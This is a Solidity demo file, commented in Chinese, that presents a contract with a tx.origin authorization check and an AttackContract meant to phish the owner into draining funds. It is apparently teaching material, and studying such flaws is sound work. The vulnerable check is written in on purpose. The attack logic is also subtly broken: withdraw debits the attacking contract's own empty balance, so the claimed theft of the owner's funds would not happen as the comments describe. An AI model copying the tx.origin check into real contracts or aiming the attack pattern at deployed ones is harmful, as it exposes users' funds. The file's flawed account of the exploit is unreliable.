// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
此合約示範 Bad Programming Practices and Language Weaknesses 漏洞。
主要漏洞在於 withdraw 函式使用 tx.origin 進行授權檢查，容易受到釣魚式攻擊。

攻擊流程說明：
1. 部署 VulnerableContract，owner 為合約部署者。
2. 部署 AttackContract 時，傳入 VulnerableContract 的地址（需傳入 address payable 參數）。
3. 攻擊者誘使 owner 主動呼叫 AttackContract 的 attack() 函式。
4. 在 attack() 呼叫中，因 tx.origin 為 owner，VulnerableContract 的 withdraw 檢查錯誤通過，導致 owner 資金遭竊取。
*/

contract VulnerableContract {
    // 敏感狀態變數，定義 owner 可能影響授權檢查的邏輯
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender; // 初始化 owner 為合約部署者
    }

    // 漏洞函式：使用 tx.origin 而非 msg.sender 來驗證使用者身份，容易遭受釣魚式攻擊
    function withdraw(uint256 amount) public {
        require(tx.origin == owner, "Not authorized"); // 錯誤依賴 tx.origin 進行身份驗證
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    // 接收 Ether 的 receive 函式，將收到的款項記錄到 msg.sender 的餘額中
    receive() external payable {
        balances[msg.sender] += msg.value;
    }
}

// 攻擊合約：利用 VulnerableContract 的授權漏洞
// 注意：參數 _target 已修改為 address payable 以符合 Solidity >=0.8.0 的顯式轉換要求。
contract AttackContract {
    VulnerableContract public target;

    // 建構子接收 VulnerableContract 的 address payable 參數
    constructor(address payable _target) {
        target = VulnerableContract(_target);
    }

    // 攻擊手法說明：
    // 此函式設計成由 owner (受害者) 主動觸發呼叫，讓 tx.origin 為 owner ，從而繞過檢查。
    function attack() public {
        // 攻擊者藉由此呼叫使 VulnerableContract 的 withdraw() 以 owner 的名義提款
        target.withdraw(1 ether);
    }

    // 用於接收轉帳的 fallback 函式
    receive() external payable {}
}
